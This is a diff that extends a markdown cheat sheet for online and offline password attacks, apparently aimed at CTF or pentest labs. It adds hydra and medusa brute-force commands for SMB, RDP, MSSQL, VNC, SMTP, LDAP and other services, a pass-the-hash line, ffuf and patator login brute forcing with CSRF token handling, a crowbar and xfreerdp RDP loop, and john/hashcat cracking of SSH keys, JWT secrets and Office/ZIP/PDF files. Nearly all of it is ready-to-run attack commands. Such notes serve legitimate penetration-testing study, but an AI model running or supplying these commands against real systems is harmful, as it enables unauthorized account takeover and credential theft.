@@ -40,6 +40,28 @@ hydra -l USER -P wordlist.txt ftp://TARGET -f -t 10
 ### RDP
 ```bash
 hydra -l USER -P wordlist.txt rdp://TARGET -f
+# RDP slow + locks accounts FAST — use small list, low threads (-t 1)
+```
+
+### SMB / WinRM / MSSQL / PostgreSQL / MySQL / VNC
+```bash
+hydra -L users.txt -P pws.txt smb://TARGET -f -t 1     # SMB — locks after ~5
+hydra -L users.txt -P pws.txt -s 5985 TARGET http-post-form ...   # WinRM via HTTP
+hydra -L users.txt -P pws.txt mssql://TARGET -f
+hydra -L users.txt -P pws.txt postgres://TARGET -f
+hydra -L users.txt -P pws.txt mysql://TARGET -f
+hydra -P pws.txt vnc://TARGET                          # VNC: no username
+hydra -L users.txt -P pws.txt telnet://TARGET -t 4
+hydra -L users.txt -P pws.txt -m "PLAIN" smtp://TARGET # SMTP AUTH
+hydra -L users.txt -P pws.txt pop3s://TARGET           # POP3 over TLS
+hydra -L users.txt -P pws.txt imaps://TARGET
+hydra -l USER -P pws.txt -s 5432 ldap2://TARGET        # LDAP simple bind
+```
+
+### Pass-the-Hash with hydra (SMB)
+```bash
+hydra -l Administrator -p 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH' smb://TARGET
+# Format: LM:NT — use empty LM hash (aad3b...) if only NT known
 ```
 
 ### http-post-form Condition String
@@ -68,6 +90,135 @@ medusa -h 127.0.0.1 -u USER -P /tmp/wordlist.txt -M ftp -t 5 -f
 ### Check empty password + user=pass
 ```bash
 medusa -h TARGET -u USER -e ns -M ssh -f
+```
+
+### Medusa Modules (Hydra equivalents)
+```bash
+medusa -d   # list all modules
+medusa -M ssh -h TARGET -u USER -P pws.txt
+medusa -M ftp -h TARGET -u USER -P pws.txt
+medusa -M http -h TARGET -m DIR:/admin -u USER -P pws.txt   # HTTP Basic on /admin
+medusa -M smbnt -h TARGET -u USER -P pws.txt                # SMB NTLM
+medusa -M mssql -h TARGET -u sa -P pws.txt
+medusa -M rdp -h TARGET -u USER -P pws.txt
+medusa -M postgres -h TARGET -u postgres -P pws.txt
+medusa -M vnc -h TARGET -p pws.txt
+```
+
+---
+
+## ffuf for Web Login Bruteforce (fastest)
+
+When the form is plain HTTP, ffuf is faster than hydra and more reliable for modern apps.
+
+```bash
+# Basic password brute (response size differs between pass/fail):
+ffuf -w pws.txt:FUZZ -u http://TARGET/login -X POST \
+     -d "username=admin&password=FUZZ" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -fs 2046
+
+# 302 redirect on success:
+ffuf -w pws.txt:FUZZ -u http://TARGET/login -X POST \
+     -d "user=admin&pass=FUZZ" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -mc 302
+
+# Dual-fuzz (user + pass simultaneously, pitchfork):
+ffuf -w users.txt:USER -w pws.txt:PASS -mode pitchfork \
+     -u http://TARGET/login -X POST -d "u=USER&p=PASS" -mc 302
+
+# JSON login:
+ffuf -w pws.txt:FUZZ -u http://TARGET/api/login -X POST \
+     -d '{"username":"admin","password":"FUZZ"}' \
+     -H "Content-Type: application/json" -fs 28
+
+# With CSRF token (extract then submit):
+TOKEN=$(curl -s http://TARGET/login | grep -oP 'csrf.*?value="\K[^"]+')
+ffuf -w pws.txt:FUZZ -u http://TARGET/login -X POST \
+     -d "csrf=$TOKEN&user=admin&pass=FUZZ" -mc 302
+# Note: if CSRF rotates per request, this won't work — switch to hydra http-post-form, or write a small Python script
+```
+
+---
+
+## Patator — When Hydra/Medusa Misbehave
+
+Patator handles edge cases hydra struggles with (multi-step auth, custom response parsing, modular conditions).
+
+```bash
+# HTTP form login:
+patator http_fuzz url=http://TARGET/login method=POST \
+        body='user=admin&pass=FILE0' 0=pws.txt \
+        -x ignore:fgrep='Invalid'
+
+# SSH:
+patator ssh_login host=TARGET user=USER password=FILE0 0=pws.txt \
+        -x ignore:mesg='Authentication failed'
+
+# DNS subdomain enum (yes — patator does this too):
+patator dns_forward domain=FILE0.target.htb 0=subs.txt -x ignore:code=3
+```
+
+---
+
+## RDP — Crowbar / xfreerdp loop
+
+```bash
+# Crowbar (specifically for RDP — handles NLA better than hydra):
+crowbar -b rdp -s TARGET/32 -u USER -C pws.txt
+
+# Manual xfreerdp loop (no lockout monitoring, slow):
+while read p; do
+  timeout 5 xfreerdp /v:TARGET /u:USER /p:"$p" /cert:ignore 2>&1 | grep -q "Authentication" || echo "HIT: $p"
+done < pws.txt
+```
+
+---
+
+## SSH Keys — Cracking Encrypted id_rsa
+
+```bash
+# Convert encrypted SSH key to hashcat format:
+ssh2john id_rsa > id_rsa.hash
+# or:
+python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
+
+# Crack passphrase:
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt   # OpenSSH new format
+hashcat -m 22931 ppk.hash /usr/share/wordlists/rockyou.txt      # PuTTY .ppk
+```
+
+---
+
+## JWT / Other Token Brute Force
+
+```bash
+# Crack a weak HS256 JWT secret with hashcat:
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+# jwt.txt = the full JWT token (header.payload.signature) on one line
+
+# jwt_tool — also handles algorithm confusion attacks:
+python3 jwt_tool.py JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt
+
+# Brute weak ZIP / PDF / Office passwords:
+zip2john archive.zip > zip.hash; john --wordlist=rockyou.txt zip.hash
+pdf2john document.pdf > pdf.hash; john --wordlist=rockyou.txt pdf.hash
+office2john doc.docx > office.hash; john --wordlist=rockyou.txt office.hash
+```
+
+---
+
+## Stegcracker — Hidden Files in Images
+
+```bash
+# Brute steghide passphrase on JPG/BMP:
+stegcracker image.jpg /usr/share/wordlists/rockyou.txt
+# Recovered file auto-extracted to image.jpg.out
+
+# Or manually after cracking:
+steghide extract -sf image.jpg -p 'PASSWORD'
 ```
 
 ---
